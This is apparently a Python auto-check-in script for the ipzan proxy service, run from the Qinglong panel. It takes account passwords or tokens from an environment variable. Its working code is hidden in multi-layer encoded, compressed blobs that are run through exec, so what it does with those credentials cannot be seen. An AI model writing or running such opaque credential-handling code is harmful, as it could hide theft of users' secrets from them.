"""
品赞HTTP代理签到 v5.21
cron: 0 0 * * 0  品赞代理.py

========= 青龙环境变量配置说明 =========

一、定时任务配置
名称：品赞HTTP代理签到
命令：python3 品赞代理.py
定时：0 0 * * 0  (每周日0点运行)

二、环境变量配置
1. 账号配置(必需)
名称：pzhttp
值：
账号1#密码1
账号2#密码2
账号3#密码3

# 或者使用token方式(不推荐)：
复制 Bearer 后面的内容，那就是token


2. 推送配置(可选)
名称：PUSH_PLUS_TOKEN
值：你的push+ token

注意事项：
1. 推荐使用账号密码方式，token容易失效
2. 多账号请换行填写

"""

# ================ 脚本配置区 ================

# 账号配置（多账号换行分隔）
DEFAULT_ACCOUNTS = """"""

# 推送配置
PUSH_TOKEN = ""  # push+ 推送token

# 功能开关
ENABLE_NOTIFY = True  # 是否开启推送通知
DEBUG = False  # 调试模式
#   ------------------祈求区------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O = /O
#                 ____/`---'____
#               .   ' | |// `.
#                / ||| : |||// 
#              / _||||| -:- |||||- 
#                | |  - /// | |
#              | _| ''---/'' | |
#                .-_ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___<|>_/___.' >"".
#        | | : `- `.;` _ /`;.`/ - ` : | |
#           \ `-. _ __/ __ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
# 
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   ------------------代码区------------------

'''
Powered By：expansion
品赞注册地址------https://www.ipzan.com?pid=g587ksmm
          __
  _(\    |@@|
 (__/\__ \--/ __
    \___|----|  |   __
        \ }{ /\ )_ / _\
        /\__/\ \__O (__
       (--/\--)    \__/
       _)(  )(_
      `---''---`
         (🌰)
'''

import base64,zlib,bz2,lzma,hashlib
import base64 as a,zlib as b,bz2 as c,lzma as d
e=b'''/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AKzAlhdACibCgcQMbFW6y1hkj0tHSRP08eq6129+fRgLANLPjwGeB1SaOCc3OB4QOE4vwLwbjXQrtnlesJ8RigEBBxXZ9WrFlZvlG5c+KeCB/4ybD/JCU0xd9BufC9s2aMSwE6qZtKDprFjnB0VPjuEifHovOh/F0f0UGGjhznKTZaInT09Wmmv9O+s85Df94x8rMFQptYeJ8pVALDpX2vL5m7xPCcP6flvU0sL7jbSPGvDpnEUYzG/JE5n2utz55PnK/6+/2qahhHg530/fo+AQ0xdKW0fNjJ5d++Kd10B5Dje5RhFwYx2A1qG666WMcPQPXwkGqGE7CjNsfcYJ5jMjMRbeEKdZuLaKeucgQ+ChLJhlgGQwbsSNAX0cKXEJsNTHplPxAVLJqV9ZaLYy6CYxZRUfc7n3EyJemWQxkON99Fk7CYfD1zumD8Hi954PjaFBfpkJy+Ufvxv7eNyYYrDV8fHrcyfp/6ZTy8q/sjX4fBpVWABz6O9hj1RRaia5pjteuevKxdvVe796/E0wJOJVRNxBb0R2iJMoPqeJR/gBmtwehGOXWqCgOs2lIj45K0J1DhBZBSAZfrnFM7DiA03QeqRTXPIP0OG5yKf4Y41HGFJpRAieA+YnuF7Z/UurZ60QBu6myFG4H0x0Mu45nZ4gCGC3O2ZiPTSuLtIg+cTvePDX7Ww0Eo1EOail7UNUE+T0U9tIgMow1ueYF+hW3BEQm+MDgp7Hi4O4QDrdVvucuLMqNXSAKA/5lqDxeH232yHiBltLas9pPx/QWYlOemqrMLcueDbHRUZjM15IwB4bbsgk41v9QAB9AS0BQAANDINLLHEZ/sCAAAAAARZWg=='''
exec(b.decompress(a.b64decode(c.decompress(a.b64decode(d.decompress(a.b64decode(e)))))).decode())
OOO0O00000O0="0";O00OO0OO0O="1";OO0O0OO000OO0O="2";O0OOO0OOO0O="3";O00OOOO00O0O="4";
OOO0O0O0O0O00OO="5";OOOO0OOOOO0OO0O="6";OO00OO00OOOOO00="7";OO00OO0OO0OOO0O="8";O00O00OO00OOOO="9";
OOO0OO00O000O="10";OOO000OO00O00="11";OOOOO00O000OOOO="12";OO0O0OOO000OOO="13";O0O00OOO0O00000="14";
O0O0OO00O00="15";OOOO0OOO0OO0O="16";OO00OOOOO0OO0OO="17";OO0O0OOO00O0O="18";OO0O00O0000O0O="19";
O00O0OO000OO0OO="20";O0OO0O0OOOOO0="21";OO0OOO0O00="22";OOO00O0OOOO000="23";O0000OOO0O="24";
O0OOOOO000OO0="25";OO0OOO00O000="26";OO0O0OOO00O0OO0="27";O00OO0OO0O0O000="28";O0O00OO000O00OO="29";
O00OOO00O0="38";O0O0O0OOO00O="31";OO0000OO00="32";OO0OOOOO0O="33";OOO0OO00O00="34";
O00OOO0O0O00="35";O0OOO00OO0OO="36";O0000000000="37";O00OOO00O0="38";O000O0O0OOOO0="39";
O0O0O0OOOO00OO="40";O00O00OOO0="41";O0OO000O000="42";OOOO0OOO0OO0O0O="43";O0O0O000000O000="44";
OOO00000O00="45";OO0000OOOO="46";OOOO0O0OO0OOO="47";O00OOOO0OO="48";O00O0OOO0O0OO="49";
OOO0O0O000OO0OO='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';
O000O0000O0O00O=lambda x:zlib.decompress(base64.b64decode(x));
O0O0O0O0O0O0000=exec;
O0O0O0O0O0O0000(O000O0000O0O00O(OOO0O0O000OO0OO))